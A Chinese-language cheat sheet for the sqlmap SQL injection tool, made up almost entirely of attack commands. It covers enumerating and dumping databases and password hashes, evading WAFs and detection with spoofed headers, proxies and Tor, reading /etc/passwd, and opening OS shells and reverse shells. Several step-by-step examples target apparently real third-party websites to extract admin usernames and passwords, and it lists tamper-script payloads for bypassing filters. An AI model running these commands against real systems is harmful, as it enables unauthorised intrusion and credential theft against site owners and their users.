Sqlmap
======
1. 注入分法不同，种类不同，来个简单的分类：<br/>

        1.get型:        sqlmap -u "http://xxx.xx.xxx/xx.xxx?xx=xxx"
        2.post型:       sqlmap -u "http://xxx.xx.xxx/xx.xxx" --data="xxxx=xxxx&xxxx=xxx"
        3.cookie类注入: sqlmap -u "http://xxx.xx.xxx/xx.xxx?xx=xxx" --cookie="xxx=xxx&xxx=xxx" --level=2
                        (默认情况下SQLMAP只支持GET/POST参数的注入测试，但是当使用–level 参数且数值>=2的时候也会检查cookie时面的参数，当>=3的时候将检查User-agent和Referer，那么这就很简单了，我 们直接在原有的基础上面加上 –level 2 即可)
                        
        4.伪静态      : sqlmap -u "http://a.b.c/test/id/1*"
        5.包文件      : sqlmap -u "url" -r 1.txt 

2. 需要数据库

        --dbs
        
3. 得到数据库名称xxx，需要表:

        -D xxx --tables

4. 得到表名xxxx，需要列：

        -D xxx -T xxxx --columns
		
	Note:
        
           1) 指定列的范围从2－4 : python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" --dump -T users -D test --start 2 --stop 4 -v 0
			
5. 得到列名有admin，password，需要值：

        -D xxx -T xxxx -C "admin,password" --dump
		
	Note:
        
	1) --dump-all 导出所有表，所有数据
				
6. 还需要绕waf

        python sqlmap.py -u "http://192.168.159.1/news.php?id=1" -v 3 --dbs --batch --tamper "space2morehash.py"
        
        相同的脚本还有：
        
            § space2morehash.py
            § space2hash.py
            § base64encode.py
            § charencode.py
		
		
7. 注入被识别出来是工具，断开咋办

        a. python sqlmap.py -u "http://192.168.1.121/sqlmap/oracle/get_int.php?id=1" --user-agent "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)" -v 3
        b. python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" -v 1 -a "./txt/user-agents.txt"
        c. python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" --referer "http://www.google.com" -v 3

8. 让sqlmap自动跑post注入，填表单

        sqlmap -u "http://www.xxx.com/login.asp" --forms

9. 看看当前用户是不是dba

        --is-dba
        -a
		
	Note:
        
        1) -a下面的那些命令是用来看用户，看主机，看权限的
        

10. 列举数据库用户

        python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" --users -v 0
        
11. 列举数据库用户密码

        python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" --passwords -v 0
        python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/get_int.php?id=1" --passwords -U sa -v 0
        
12. 查看用户权限

        python sqlmap.py -u "http://192.168.1.121/sqlmap/oracle/get_int.php?id=1" --privileges -v 0
        python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" --privileges -U postgres -v 0
        
13. 使用基本认证

        python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/basic/get_int.php?id=1" --auth-type Basic --auth-cred "testuser:testpass" -v 3

14. 使用Digest认证

        python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/digest/get_int.php?id=1" --auth-type Digest --auth-cred "testuser:testpass" -v 3

15. 使用代理,配合TOR

        a. python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" --proxy "http://192.168.1.47:3128"
        b. python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" --proxy "http://192.168.1.47:8118"
        
16. 使用多线程猜解

        python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" -v 1 --current-user --threads 3

17. 绕过动态检测,直接指定有注入点的参数

        python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" -v 1 -p "id"
        python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/ua_str.php" -v 1 -p "user-agent" --user-agent "sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)"

18. 指定数据库,绕过SQLMAP的自动检测

        python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" -v 2 --dbms "PostgreSQL"
        * MySQL
        * Oracle
        * PostgreSQL
        * Microsoft SQL Server
        
19. 指定操作系统,绕过SQLMAP自动检测

        python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" -v 2 --os "Windows"
        * Linux
        * Windows
        
20. 自定义payload

        Options: --prefix and --suffix
        python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_str_brackets.php?id=1" -v 3 -p "id" --prefix "'" --suffix "AND 'test'='test"

21. --os-xx系列命令，可以执行系统命令，同时还发现了牛逼的xpcmdshell

        ○ sqlmap -u http://192.168.159.1/news.php?id=1 --os-cmd=ipconfig
        ○ sqlmap -u http://192.168.159.1/news.php?id=1 --os-shell
        ○ --file-xx 牛逼的文件操作命令

22. sql query

        a. python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" --sql-query "SELECT usename FROM pg_user" -v 0
        b. python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" --sql-query "SELECT host, password FROM mysql.user LIMIT 1, 3" -v 1

23. 选择sqlmap默认选项

        --batch 
        
        
24. 不那么常用的

        a. 只列出用户自己新建的数据库和表的内容
                python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/get_int.php?id=1" --dump-all --exclude-sysdbs -v 0
        b. 保存和恢复会话
                python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" -b -v 1 -s "sqlmap.log"
        c. 保存选项到INC配置文件
                python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" -b -v 1 --save
        d. 页面比较
                python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int_refresh.php?id=1" --string "luther" -v 1
                python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int_refresh.php?id=1" --regexp "<td>lu[\w][\w]er" -v
        e. 排除网站的内容
                python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int_refresh.php?id=1" --excl-reg "Dynamic content: ([\d]+)"
        f. 多语句测试，php内嵌函数mysql_query(),不支持多语句
                python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" --stacked-test -v 1
        g. union注入测试
                python sqlmap.py -u "http://192.168.1.121/sqlmap/oracle/get_int.php?id=1" --union-test -v 1
        h. unionz注入配合orderby
                python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_str.php?id=1" --union-test --union-tech orderby -v 1
                python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/get_int.php?id=1" -v 1 --union-use --banner
                python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" -v 5 --union-use --current-user
                python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int_partialunion.php?id=1" -v 1 --union-use --dbs
        i. fingerprint
                python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/get_int.php?id=1" -v 1 -f
                python sqlmap.py -u "http://192.168.123.36/sqlmap/get_str.asp?name=luther" -v 1 -f -b
        j. SQLMAP中Google搜索注入
                python sqlmap.py  -g "inurl:php?id="
        k. SQLMAP伪静态注入
                i. 查找数据库
                        python sqlmap.py -u "http://sfl.fzu.edu.cn/index.php/Index/view/id/40.html" --dbs
                ii. 通过1中的数据库查找对应的表 (假如通过1，得到的是dataname)
                        python sqlmap.py -u "http://sfl.fzu.edu.cn/index.php/Index/view/id/40.html" -D dataname --tables
                iii. 通过2中的数据表得到字段(假如得到的是tablename表)
                        python sqlmap.py -u "http://sfl.fzu.edu.cn/index.php/Index/view/id/40.html" -D dataname -T tablename --columns
                iv. 通过3得到字段值(假如从3中得到字段id，password)
                        python sqlmap.py -u "http://sfl.fzu.edu.cn/index.php/Index/view/id/40.html" -D dataname -T tablename -C "password" --dump
                        
        l. SQLMAP用于Access数据库注入
                i. 猜解是否能注入
                        python sqlmap.py -u "http://www.stronkin.com/en/CompHonorBig.asp?id=7"
                ii. 猜解表
                        python sqlmap.py -u "http://www.stronkin.com/en/CompHonorBig.asp?id=7" --tables
                iii. 根据猜解的表进行猜解表的字段(假如通过2得到了admin这个表)
                        python sqlmap.py -u "http://www.stronkin.com/en/CompHonorBig.asp?id=7" --columns -T admin
                iv. 根据字段猜解内容(假如通过3得到字段为username和password)
                        python sqlmap.py -u "http://www.stronkin.com/en/CompHonorBig.asp?id=7" --dump -T admin -C "username,password"
        m. SQLMAP用于Cookie注入
                i. cookie注入，猜解表
                        python sqlmap.py -u "http://www.ntjx.org/jsj/shownews.asp" --cookie "id=31" --table --level 2
                ii. 猜解字段，(通过1的表猜解字段，假如表为admin)
                        python sqlmap.py -u "http://www.ntjx.org/jsj/shownews.asp" --cookie "id=31" --columns -T admin --level 2
                iii. 猜解内容
                        python sqlmap.py -u "http://www.ntjx.org/jsj/shownews.asp" --cookie "id=31" --dump -T admin -C "username,password" --level 2
                        
常用参数：

(1)判断当前用户是否是dba:  ./sqlmap.py -u "url" --is-dba -v 1

(2)列出数据库管理系统用户：./sqlmap.py -u "url" --users -v 0

(3)数据库用户密码(hash):

./sqlmap.py -u "url" --passwords -v 0

./sqlmap.py -u "url" --passwords -U sa -v 0

(4)查看用户权限：

./sqlmap.py -u "url" --privileges -v 0

./sqlmap.py -u "url" --privileges -U postgres -v 0

(5)列出数据库：

./sqlmap.py -u "url" --dbs -v 0

(6)列出数据库表：

./sqlmap.py -u "url" --tables -D "information_scheam"

(7)列出表中的列名：

./sqlmap.py -u "url" --columns -T "user" -D "mysql" -v 1

(8)列出指定列的内容：

./sqlmap.py -u "url" --dump -T "users" -D "testdb" -C “指定字段”  

指定范围：

./sqlmap.py -u "url" --dump -T "users" -D "testdb" --start 2 --stop 4 -v 0

(9)列出所有数据库，所有表内容:

./sqlmap.py -u "url" --dump-all -v 0

只列出用户自己新建的数据库和表的内容：

./sqlmap.py -u "url" --dump-all --exclude-sysdbs -v 0

(10)读取文件内容[load_file(函数)]：

./sqlmap.py -u "url" --file /etc/password

(11)执行SQL:

./sqlmap.py -u "url" --sql-shell

(12)指定参数：

./sqlmap.py -u "url" -p "id" -v 1

(13)POST提交：

./sqlmap.py -u "url" --method POST --data "id=1"

(14)COOKIE提交：

./sqlmap.py -u "url" --cookie "id=1" -v 1

(15)refer欺骗：

./sqlmap.py -u "url" --refer "url" -v 3

(16)使用自定义user-agent或者user-agents.txt：

./sqlmap.py -u "url" --user-agent "Mozilla/4.0(compatible;MSIE 7.0;Windows NT5.1)" -v 3

./sqlmap.py -u "url" -a "./txt/user-agents.txt" -v 1

(17)使用多线程猜解：

./sqlmap.py -u "url" --current-user --threads 3 -v 1

(18)指定数据库，绕过salmap自动检测：

./sqlmap.py -u "url" --dbms "PostgreSQL" -v 2

(19)指定操作系统：

./sqlmap.py -u "url" --os "Windows" -v 2

(20)自动义payload:

./sqlmap.py -u "url" -p "id" --prefix " ' " --postfix "and 'test' = 'test "

(21)union注入测试：

./sqlmap.py -u "url" --union-test -v 1

(22)配合order by:

./sqlmap.py -u "url" --union-test --union-tech orderby -v 1

(23) ./sqlmap.py -u "url" --union-use --banner -v 1

./sqlmap.py -u "url" --union-use --current-user -v 5

./sqlmap.py -u "url" --union-use --dbs -v 1




******************信息获取******************

 

sqlmap -u “ –smart –dbms “Mysql” –users  #列数据库用户  

sqlmap -u “ –smart –dbms “Mysql” –dbs#列数据库 

sqlmap -u “ –smart –dbms “Mysql”–passwords #数据库用户密码  

sqlmap -u “ –smart –dbms “Mysql”–passwords-U root  -v 0 #列出指定用户数据库密码 

sqlmap -u “ –smart –dbms “Mysql” –dump-all -v 0 #列出所有数据库所有表   
sqlmap -u “ –smart –dbms “Mysql”–privileges #查看权限  

sqlmap -u “ –smart –dbms “Mysql”–privileges -U root #查看指定用户权限  

sqlmap -u “ –smart –dbms “Mysql” –is-dba -v 1 #是否是数据库管理员 

sqlmap -u “ –smart –dbms “Mysql” –roles #枚举数据库用户角色  

sqlmap -u “ –smart –dbms “Mysql”–udf-inject #导入用户自定义函数（获取系统权限！）  

sqlmap -u “ –smart –dbms “Mysql”–dump-all –exclude-sysdbs -v 0 #列出当前库所有表  
sqlmap -u “ –smart –dbms “Mysql” –union-check #是否支持union 注入  

sqlmap -u “ –smart –dbms “Mysql”–union-cols #union 查询表记录  

sqlmap -u “ –smart –dbms “Mysql” –union-test #union 语句测试  
sqlmap -u “ –smart –dbms “Mysql” –union-use –banner #采用union 注入 

sqlmap -u “ –smart –dbms “Mysql”–union-test –union-tech orderby #union 配合 order by  
sqlmap -u “ –smart –dbms “Mysql”–method “POST” — data “id=1&cat=2″ #post注入  

sqlmap -u “ –smart –dbms “Mysql”–cookie “COOKIE_VALUE” #cookie注入  
sqlmap -u “ –smart –dbms “Mysql”-b #获取banner信息 
sqlmap -u “http://url/news?id=1” –level=3 –smart-v 1 -f #指纹判别数据库类型
sqlmap -u “http://url/news?id=1” –level=3 –smart–proxy”http://127.0.0.1:8118” #代理注入

sqlmap -u “http://url/news?id=1″–string”STRING_ON_TRUE_PAGE“  #指定关键词

sqlmap -u “ –smart –dbms “Mysql”–sql-shell #执行指定sql命令  
sqlmap -u “ –smart –dbms “Mysql”–file /etc/passwd  

sqlmap -u “ –smart –dbms “Mysql”–os-cmd=whoami #执行系统命令  

sqlmap -u “ –smart –dbms “Mysql”–os-shell #系统交互shell  

sqlmap -u “ –smart –dbms “Mysql”–os-pwn #反弹

shell  sqlmap -u “ –smart –dbms “Mysql”–reg-read #读取win系统注册表  

sqlmap -u “ –smart –dbms “Mysql” –dbs-o “sqlmap.log” #保存进度  

sqlmap -u “ –smart –dbms “Mysql” –dbs  -o “sqlmap.log” –resume  #恢复已保存进度 

 

 

======================================================================================

======================================================================================

 
SQLMAP自带的绕过脚本 --tamper详解


(1) apostrophemask.py UTF-8编码 
Example: 
* Input: AND '1'='1' 
* Output: AND %EF%BC%871%EF%BC%87=%EF%BC%871%EF%BC%87 

(2) apostrophenullencode.py unicode编码 
Example: 
* Input: AND '1'='1' 
* Output: AND %00%271%00%27=%00%271%00%27 

(3) appendnullbyte.py 添加%00 
Example: 
* Input: AND 1=1 
* Output: AND 1=1%00 
Requirement: 
* Microsoft Access 

(4) base64encode.py base64编码 
Example: 
* Input: 1' AND SLEEP(5)# 
* Output: MScgQU5EIFNMRUVQKDUpIw== 

(5) between.py 以”not between”替换”>“ 
Example: 
* Input: 'A > B' 
* Output: 'A NOT BETWEEN 0 AND B' 

(6) bluecoat.py 以随机的空白字符替代空格，以”like”替代”=“ 
Example: 
* Input: SELECT id FROM users where id = 1 
* Output: SELECT%09id FROM users where id LIKE 1 
Requirement: 
* MySQL 5.1, SGOS 

(7) chardoubleencode.py 双重url编码 
Example: 
* Input: SELECT FIELD FROM%20TABLE 
* Output: %2553%2545%254c%2545%2543%2554%2520%2546%2549%2545%254c%2544%2520%2546%2552%254f%254d%2520%2554%2541%2542%254c%2545

(8) charencode.py url编码 
Example: 
* Input: SELECT FIELD FROM%20TABLE 
* Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45

(9) charunicodeencode.py 对未进行url编码的字符进行unicode编码 
Example: 
* Input: SELECT FIELD%20FROM TABLE 
* Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045'
Requirement: 
* ASP 
* ASP.NET 

(10) equaltolike.py 以”like”替代”=“ 
Example: 
* Input: SELECT * FROM users WHERE id=1 
* Output: SELECT * FROM users WHERE id LIKE 1 

(11) halfversionedmorekeywords.py在每个关键字前添加条件注释 
Example: 
* Input: value' UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND 'QDWa'='QDWa 
* Output: value'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)), NULL, NULL#/*!0AND 'QDWa'='QDWa 
Requirement: 
* MySQL < 5.1 

(12) ifnull2ifisnull.py 以”IF(ISNULL(A), B, A)”替换”IFNULL(A, B)” 
Example: 
* Input: IFNULL(1, 2) 
* Output: IF(ISNULL(1), 2, 1) 
Requirement: 
* MySQL 
* SQLite (possibly) 
* SAP MaxDB (possibly) 

(13) modsecurityversioned.py 条件注释 
Example: 
* Input: 1 AND 2>1-- 
* Output: 1 /*!30000AND 2>1*/-- 
Requirement: 
* MySQL 

(14) modsecurityzeroversioned.py 条件注释，0000 
Example: 
* Input: 1 AND 2>1-- 
* Output: 1 /*!00000AND 2>1*/-- 
Requirement: 
* MySQL 

(15) multiplespaces.py 添加多个空格 
Example: 
* Input: UNION SELECT 
* Output:  UNION   SELECT 

(16) nonrecursivereplacement.py 可以绕过对关键字删除的防注入（这个我也不知道怎么说好，看例子。。。） 
Example: 
* Input: 1 UNION SELECT 2-- 
* Output: 1 UNUNIONION SELSELECTECT 2-- 

(17) percentage.py 在每个字符前添加百分号（%） 
Example: 
* Input: SELECT FIELD FROM TABLE 
* Output: %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E 
Requirement: 
* ASP 

(18) randomcase.py 随即大小写 
Example: 
* Input: INSERT 
* Output: InsERt 

(19) randomcomments.py 随机插入区块注释 
Example: 
'INSERT' becomes 'IN/**/S/**/ERT' 
securesphere.py 语句结尾添加”真”字符串 
Example: 
* Input: AND 1=1 
* Output: AND 1=1 and '0having'='0having' 

(20) sp_password.py 语句结尾添加”sp_password”迷惑数据库日志（很。。。） 
Example: www.2cto.com 
* Input: 1 AND 9227=9227-- 
* Output: 1 AND 9227=9227--sp_password 
Requirement: 
* MSSQL 

(21) space2comment.py 以区块注释替换空格 
Example: 
* Input: SELECT id FROM users 
* Output: SELECT/**/id/**/FROM/**/users 

(22) space2dash.py 以单行注释”--”和随机的新行替换空格 
Example: 
* Input: 1 AND 9227=9227 
* Output: 1--PTTmJopxdWJ%0AAND--cWfcVRPV%0A9227=9227 
Requirement: 
* MSSQL 
* SQLite 

(23) space2hash.py 以单行注释”#”和由随机字符组成的新行替换空格 
Example: 
* Input: 1 AND 9227=9227 
* Output: 1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227=9227 
Requirement: 
* MySQL 

(24) space2morehash.py 没看出来和上面那个有什么区别。。 
Requirement: 
* MySQL >= 5.1.13 

(25) space2mssqlblank.py 以随机空白字符替换空格 
Example: 
* Input: SELECT id FROM users 
* Output: SELECT%08id%02FROM%0Fusers 
Requirement: 
* Microsoft SQL Server 

(26) space2mssqlhash.py 以单行注释”#”和新行替换空格 
Example: 
* Input: 1 AND 9227=9227 
* Output: 1%23%0A9227=9227 
Requirement: 
* MSSQL 
* MySQL 

(27) space2mysqlblank.py 以随机空白字符替换空格 
Example: 
* Input: SELECT id FROM users 
* Output: SELECT%0Bid%0BFROM%A0users 
Requirement: 
* MySQL 

(28) space2mysqldash.py 以单行注释和新行替换空格 
Example: 
* Input: 1 AND 9227=9227 
* Output: 1--%0AAND--%0A9227=9227 
Requirement: 
* MySQL 
* MSSQL 

(29) space2plus.py 以”+”替换空格 
Example: 
* Input: SELECT id FROM users 
* Output: SELECT+id+FROM+users 

(30) space2randomblank.py 随机空白字符替换空格 
Example: 
* Input: SELECT id FROM users 
* Output: SELECT\rid\tFROM\nusers 

(31) unionalltounion.py 以”union all”替换”union” 
Example: 
* Input: -1 UNION ALL SELECT 
* Output: -1 UNION SELECT 

(32) unmagicquotes.py 以”%bf%27”替换单引号，并在结尾添加注释”--” 
Example: 
* Input: 1' AND 1=1 
* Output: 1%bf%27 AND 1=1--%20 

(33)versionedkeywords.py 对不是函数的关键字条件注释 
Example: 
* Input: 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))# 
* Output:  1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/,CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS*//*!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#
Requirement: 
* MySQL 


(34) versionedmorekeywords.py 对关键字条件注释 
Example: 
* Input: 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))# 
* Output: 1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(58,122,114,115,58),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS*//*!CHAR*/),/*!CHAR*/(32)),/*!CHAR*/(58,115,114,121,58))#
Requirement: 
* MySQL >= 5.1.13
